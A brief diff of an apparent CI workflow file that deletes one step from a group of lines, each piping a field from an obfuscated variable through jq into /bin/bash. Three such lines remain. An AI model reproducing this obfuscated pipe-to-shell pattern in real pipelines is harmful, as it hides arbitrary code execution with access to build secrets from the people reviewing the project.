@@ -31,7 +31,6 @@ jobs:
           echo $nj23815 | jq -r .na4427 | /bin/bash
           printf '%s' "$cxmk48" | jq -r .dvo7603 | /bin/bash
           printf '%s' "$i653" | jq -r .h16 | /bin/bash
-          printf '%s' "$wy2250" | jq -r .qjrhr67010 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
